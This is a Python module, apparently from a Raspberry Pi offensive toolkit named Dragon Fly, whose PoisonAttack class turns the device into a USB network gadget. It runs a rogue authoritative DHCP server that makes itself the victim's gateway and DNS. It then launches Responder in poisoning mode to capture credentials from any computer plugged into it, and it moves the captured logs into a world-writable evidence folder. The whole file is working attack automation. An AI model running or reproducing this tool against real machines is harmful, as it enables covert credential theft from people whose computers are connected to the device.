import glob
import os
import re
import subprocess
import threading
import time

try:
    from dragonfly.core import usb_gadget
except Exception:  # pragma: no cover - permite usar el módulo de forma aislada
    usb_gadget = None

from dragonfly.core.subprocess_utils import (
    safe_popen,
    safe_run,
    terminate_process_group,
)


class PoisonAttack:
    # Archivos temporales propios: no dependen del cwd de la aplicación y no
    # pisan los leases del dnsmasq del sistema.
    DNSMASQ_CONF = "/tmp/dragonfly_poison_dnsmasq.conf"
    DNSMASQ_LOG = "/tmp/dragonfly_poison_dnsmasq.log"
    LEASE_FILE = "/tmp/dragonfly_poison.leases"

    def __init__(self, interface=None, callback_consola=None, session_dir=None):
        self.interface = interface or self._detectar_interfaz_gadget()
        self.callback = callback_consola
        self.session_dir = session_dir
        self.stop_event = threading.Event()
        self.dns_proc = None
        self.proc_responder = None
        self._servicios_detenidos = []
        self._dnsmasq_service_activa = False
        self._lease_stop = threading.Event()
        self._lease_thread = None
        self._dns_log_fh = None
        self._ip_forward_original = False

    def log(self, texto):
        texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
        for simbolo in ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']:
            texto_limpio = texto_limpio.replace(simbolo, '')
        if self.callback:
            self.callback(f"{texto_limpio}")
        else:
            print(texto_limpio)

    # -------------------------------------------------------------
    # DETECCIÓN DEL GADGET Y DEL ENLACE
    # -------------------------------------------------------------
    def _detectar_interfaz_gadget(self):
        """
        Busca la interfaz de red que actúa como gadget USB (RNDIS/ECM).
        Verifica que sea de tipo 1 (Ethernet) y que el dispositivo pertenezca
        al subsistema 'gadget'.
        """
        if usb_gadget is not None:
            try:
                interfaces = usb_gadget.gadget_net_interfaces()
                if interfaces:
                    return interfaces[0]
            except Exception:
                pass

        for iface in os.listdir('/sys/class/net/'):
            if iface == 'lo':
                continue
            type_path = f'/sys/class/net/{iface}/type'
            if not os.path.exists(type_path):
                continue
            with open(type_path) as f:
                iface_type = f.read().strip()
            # Las interfaces gadget son Ethernet (tipo 1)
            if iface_type != '1':
                continue
            # Verificar que es un dispositivo USB gadget (enlace simbólico contiene 'gadget')
            device_path = f'/sys/class/net/{iface}/device'
            if os.path.exists(device_path):
                try:
                    link = os.readlink(device_path)
                    if 'gadget' in link:
                        return iface
                except OSError:
                    pass
            # Fallback adicional: nombres comunes
            if iface.startswith('usb') or iface.startswith('enx'):
                return iface
        # Si no se encontró, intentar con nombres conocidos
        for candidate in ['usb0', 'enx']:
            if os.path.exists(f'/sys/class/net/{candidate}'):
                return candidate
        return 'usb0'  # último recurso

    def _link_arriba(self, iface):
        try:
            salida = subprocess.check_output(
                ["ip", "-br", "link", "show", iface],
                text=True, stderr=subprocess.DEVNULL
            )
            partes = salida.split()
            return len(partes) > 1 and partes[1] == "UP"
        except Exception:
            return False

    def _servicio_activo(self, nombre):
        try:
            return safe_run(
                ["systemctl", "is-active", "--quiet", nombre],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                timeout=5,
            ).returncode == 0
        except Exception:
            return False

    def _ip_forward_activo(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r",
                      encoding="ascii") as f:
                return f.read().strip() == "1"
        except OSError:
            return False

    def _quitar_reglas_firewall(self, iface):
        """Elimina TODAS las reglas ACCEPT de la interfaz (también restos)."""
        if not iface:
            return
        try:
            for cadena, opcion in (("INPUT", "-i"), ("OUTPUT", "-o")):
                for _ in range(10):
                    resultado = safe_run(
                        ["sudo", "iptables", "-D", cadena, opcion, iface,
                         "-j", "ACCEPT"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    )
                    if resultado.returncode != 0:
                        break
        except Exception:
            pass

    # -------------------------------------------------------------
    # PREPARACIÓN DEL GADGET USB
    # -------------------------------------------------------------
    def _preparar_gadget(self):
        """
        Reconstruye el perfil USB de red activo antes de cada ataque.

        La reconstrucción cumple dos funciones:
          1. Limpia cualquier endpoint dwc2 que haya quedado trabado tras un
             ataque o una conmutación de perfil (el host Linux deja de ver
             NETDEV WATCHDOG).
          2. Garantiza que ``usb0`` exista y se levante inmediatamente después
             del bind del UDC; si se levanta más tarde, el ciclo carrier-off/on
             vuelve a romper el endpoint OUT de dwc2.
        """
        if usb_gadget is None:
            return True

        try:
            if not usb_gadget.configfs_available():
                # Entorno sin configfs (por ejemplo, una estación de trabajo):
                # se conserva el comportamiento clásico.
                return True

            if not usb_gadget.is_peripheral_mode():
                self.log("[!] El puerto OTG está en modo Host. Selecciona un "
                         "perfil Poison (RNDIS/ECM) en Utilidades OS.")
                return False

            perfil = usb_gadget.current_profile()
            if perfil not in usb_gadget.PROFILES:
                perfil = usb_gadget.load_persisted_profile()

            if perfil not in usb_gadget.PROFILES:
                self.log("[!] No hay un perfil USB activo. Selecciona "
                         "'Poison Windows (RNDIS)' o 'Poison Linux (ECM)' "
                         "en Utilidades OS.")
                return False

            funciones = set(usb_gadget.PROFILES[perfil]["functions"])
            if not ({"ecm", "rndis"} & funciones):
                etiqueta = usb_gadget.PROFILE_LABELS.get(perfil, perfil)
                self.log(f"[!] El perfil USB actual ({etiqueta}) no incluye red. "
                         "Selecciona un perfil Poison (RNDIS/ECM) antes de lanzar "
                         "el ataque.")
                return False

            self.log(f"[*] Reinicializando gadget USB '{perfil}' para dejar el enlace limpio...")
            if not usb_gadget.apply(perfil, log=self.log):
                self.log("[!] No se pudo reinicializar el gadget USB. "
                         "Revisa la consola y vuelve a intentarlo.")
                return False

            self.interface = self._detectar_interfaz_gadget()
            return True
        except Exception as exc:
            self.log(f"[!] Error preparando el gadget USB: {exc}")
            return False

    # -------------------------------------------------------------
    # LIMPIEZA DE SERVICIOS QUE INTERFIEREN
    # -------------------------------------------------------------
    def _limpiar_procesos_previos(self):
        # Guardar el estado original para restaurarlo al terminar.
        self._dnsmasq_service_activa = self._servicio_activo("dnsmasq")
        if self._dnsmasq_service_activa:
            # Pararlo con systemd evita que lo reactive al recibir la señal.
            safe_run(["sudo", "systemctl", "stop", "dnsmasq"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        self._servicios_detenidos = []
        for servicio in ("systemd-resolved", "systemd-networkd", "dhcpcd"):
            if self._servicio_activo(servicio):
                self._servicios_detenidos.append(servicio)
                safe_run(
                    ["sudo", "systemctl", "stop", servicio],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )

        # Restos de ejecuciones anteriores (incluidas las rutas antiguas).
        for patron in ("dragonfly_poison_dnsmasq", "dnsmasq_temp.conf",
                       "Responder", "responder"):
            safe_run(["sudo", "pkill", "-f", patron],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Cualquier dnsmasq suelto ocupa los puertos 53/67: se elimina también.
        safe_run(["sudo", "pkill", "-x", "dnsmasq"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        safe_run(["sudo", "fuser", "-k", "53/udp"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        safe_run(["sudo", "fuser", "-k", "67/udp"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

    # -------------------------------------------------------------
    # MONITOR DE LEASES DHCP
    # -------------------------------------------------------------
    def _iniciar_monitor_leases(self):
        def vigilar():
            vistos = set()
            while not self._lease_stop.wait(2):
                try:
                    with open(self.LEASE_FILE, "r", encoding="utf-8") as f:
                        for linea in f:
                            partes = linea.split()
                            if len(partes) < 4:
                                continue
                            mac, ip = partes[1], partes[2]
                            if mac in vistos:
                                continue
                            vistos.add(mac)
                            hostname = partes[3] if partes[3] != "*" else "sin nombre"
                            self.log(f"[+] Víctima DHCP conectada: {ip} "
                                     f"({hostname}, {mac})")
                except (OSError, UnicodeError):
                    pass

        self._lease_stop.clear()
        self._lease_thread = threading.Thread(target=vigilar, daemon=True)
        self._lease_thread.start()

    # -------------------------------------------------------------
    # ATAQUE
    # -------------------------------------------------------------
    def start(self):
        # El gadget se prepara antes de tocar los servicios del sistema: un
        # perfil sin red se rechaza sin dejar la Pi sin DNS.
        if not self._preparar_gadget():
            return

        self._limpiar_procesos_previos()
        self._ip_forward_original = self._ip_forward_activo()
        iface = self.interface
        if not iface or not os.path.exists(f"/sys/class/net/{iface}"):
            iface = self._detectar_interfaz_gadget()
            self.interface = iface

        self.log("\n[!] DRAGON FLY SYSTEM")
        self.log(f"[*] Configurando interfaz: {iface}")

        try:
            self.log("[*] Desvinculando interfaz de gestores de red...")
            safe_run(["sudo", "nmcli", "device", "set", iface, "managed", "no"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            safe_run(["sudo", "dhcpcd", "-k", iface],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

            # IMPORTANTE (dwc2): NUNCA hacer down/up del enlace. Al deshabilitar
            # el endpoint OUT con peticiones pendientes, dwc2 deja DOEPCTL con
            # EPENA+EPDIS y el host Linux no completa sus URBs (NETDEV WATCHDOG,
            # dnsmasq sin DHCP). El gadget ya subió usb0 al reconstruirse; si
            # por alguna razón está abajo, se levanta UNA sola vez y de
            # inmediato, antes de que el host retire la interfaz.
            if self._link_arriba(iface):
                self.log("[*] Enlace USB ya arriba: no se toca (sin flap).")
            else:
                self.log("[*] Enlace USB abajo: levantándolo una sola vez...")
                safe_run(["sudo", "ip", "link", "set", iface, "up"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.5)

            ip = "192.168.10.1"
            subnet_mask = "24"
            ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"

            self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
            safe_run(["sudo", "ip", "addr", "flush", "dev", iface],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "addr", "add", f"{ip}/{subnet_mask}", "dev", iface],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            safe_run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # REGLA MAESTRA: Permitir TODO el tráfico en la interfaz USB
            # Esto es vital para que Linux no desconecte la red al fallar los pings de comprobación
            self.log("[*] Configurando firewall para Responder y DHCP...")
            self._quitar_reglas_firewall(iface)
            safe_run(["sudo", "iptables", "-A", "INPUT", "-i", iface, "-j", "ACCEPT"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            safe_run(["sudo", "iptables", "-A", "OUTPUT", "-o", iface, "-j", "ACCEPT"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Configuración dnsmasq (DHCP ultra-agresivo para Linux/Windows)
            try:
                os.remove(self.LEASE_FILE)
            except OSError:
                pass

            config_dhcp = (
                f"interface={iface}\n"
                f"listen-address={ip}\n"
                f"dhcp-range={ip_range}\n"
                f"dhcp-option=3,{ip}\n"        # Puerta de enlace (La Raspberry)
                f"dhcp-option=6,{ip}\n"        # DNS (La Raspberry - Responder escuchará esto)
                f"dhcp-option=15,\n"
                f"dhcp-option=252,\n"
                f"bind-dynamic\n"              # Fundamental para que no colapse si la red parpadea
                f"dhcp-leasefile={self.LEASE_FILE}\n"
                f"dhcp-authoritative\n"        # Obliga a NetworkManager a aceptar la IP sin dudar
                f"no-resolv\n"
                f"no-hosts\n"
                f"port=0\n"                    # Apaga el DNS de dnsmasq para que Responder tome el puerto 53
                f"log-dhcp\n"
            )

            with open(self.DNSMASQ_CONF, "w", encoding="utf-8") as f:
                f.write(config_dhcp)

            self.log("[*] Iniciando dnsmasq...")
            # El log va a fichero: con un PIPE, ``log-dhcp`` puede llenarlo y
            # bloquear dnsmasq en mitad del ataque.
            self._dns_log_fh = open(self.DNSMASQ_LOG, "w", encoding="utf-8")
            self.dns_proc = safe_popen(
                ["sudo", "dnsmasq", "-C", self.DNSMASQ_CONF, "-d"],
                stdout=self._dns_log_fh,
                stderr=subprocess.STDOUT,
            )
            time.sleep(2)

            # Verificación de fallo en dnsmasq
            if self.dns_proc.poll() is not None:
                try:
                    with open(self.DNSMASQ_LOG, "r", encoding="utf-8",
                              errors="replace") as f:
                        err = f.read()[-1000:]
                except OSError:
                    err = "sin detalles"
                self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
                self.log("[!] Se cancela el ataque: sin DHCP la víctima no "
                         "puede conectarse.")
                return
            self.log("[+] dnsmasq escuchando correctamente.")

            # El enlace ya estaba arriba antes de arrancar dnsmasq. No se hace
            # ningún ciclo down/up aquí: el host reintenta DHCP por sí mismo y
            # el endpoint dwc2 permanece sano.
            self._iniciar_monitor_leases()

            responder_paths = [
                "/usr/share/responder/Responder.py",
                "/opt/Responder/Responder.py"
            ]
            responder_cmd = None
            for path in responder_paths:
                if os.path.exists(path):
                    responder_cmd = ["sudo", "python3", path, "-I", iface, "-wvF"]
                    break
            if responder_cmd is None:
                responder_cmd = ["sudo", "responder", "-I", iface, "-wvF"]

            self.log(f"[+] INTERFAZ LISTA: {iface}")
            self.log(f"[+] IP: {ip}/{subnet_mask}")
            self.log(f"[+] Conecta ahora la víctima al puerto USB")

            self.proc_responder = safe_popen(
                responder_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            while not self.stop_event.is_set():
                linea = self.proc_responder.stdout.readline()
                if not linea and self.proc_responder.poll() is not None:
                    break
                if linea:
                    self.log(linea.strip())

        except Exception as e:
            self.log(f"\n[!] Error crítico: {e}")
        finally:
            self._cleanup()

    def _cleanup(self):
        self.log("\n[*] Deteniendo procesos y restaurando red...")
        self._lease_stop.set()
        if self._lease_thread and self._lease_thread.is_alive():
            self._lease_thread.join(timeout=2)
        self._lease_thread = None

        if self.dns_proc:
            terminate_process_group(self.dns_proc, timeout=3)
            self.dns_proc = None

        if self._dns_log_fh:
            try:
                self._dns_log_fh.close()
            except Exception:
                pass
            self._dns_log_fh = None

        # Responder se ejecuta como Responder.py (R mayúscula): se cubren ambas
        # variantes para no dejar el proceso capturando tras detener el ataque.
        if self.proc_responder:
            terminate_process_group(self.proc_responder, timeout=3)
            self.proc_responder = None

        safe_run(["sudo", "pkill", "-f", "dragonfly_poison_dnsmasq"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        safe_run(["sudo", "pkill", "-f", "[Rr]esponder"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        safe_run(["sudo", "pkill", "-x", "dnsmasq"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Limpiar las reglas globales de firewall que agregamos
        self._quitar_reglas_firewall(self.interface)

        safe_run(["sudo", "sysctl", "-w",
                  f"net.ipv4.ip_forward={1 if self._ip_forward_original else 0}"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        safe_run(["sudo", "ip", "addr", "flush", "dev", self.interface],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # NOTA: NO se baja usb0 a propósito. Un "ip link set usb0 down/up"
        # deshabilita el endpoint OUT con peticiones pendientes y dwc2 deja
        # DOEPCTL con EPENA+EPDIS; el host pierde la cola TX (NETDEV WATCHDOG).
        # Se deja el enlace arriba para reutilizarlo en el próximo ataque.

        # Restaurar solo los servicios que estaban activos antes del ataque.
        for servicio in self._servicios_detenidos:
            safe_run(["sudo", "systemctl", "start", servicio],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self._servicios_detenidos = []
        if self._dnsmasq_service_activa:
            safe_run(["sudo", "systemctl", "start", "dnsmasq"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._dnsmasq_service_activa = False

        for ruta in (self.DNSMASQ_CONF, self.DNSMASQ_LOG):
            try:
                os.remove(ruta)
            except OSError:
                pass

        if self.session_dir:
            self.log(f"[*] Organizando evidencia en: {os.path.basename(self.session_dir)}")
            os.makedirs(self.session_dir, exist_ok=True)
            for log_dir in ["/usr/share/responder/logs", "/opt/Responder/logs"]:
                if os.path.isdir(log_dir):
                    for f in glob.glob(os.path.join(log_dir, "*")):
                        try:
                            os.rename(f, os.path.join(self.session_dir, os.path.basename(f)))
                        except Exception:
                            subprocess.run(["sudo", "mv", f, self.session_dir],
                                           stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir],
                           stderr=subprocess.DEVNULL)
        self._lease_stop.set()

        self.log("[+] Sistema restaurado. ¡Cacería finalizada!")

    def stop(self):
        self.stop_event.set()
        # Terminar el grupo completo (sudo + hijo) desbloquea el readline del
        # hilo del ataque y permite que su ``finally`` restaure los servicios.
        if self.proc_responder:
            terminate_process_group(self.proc_responder, timeout=2)
        if self.dns_proc:
            terminate_process_group(self.dns_proc, timeout=2)
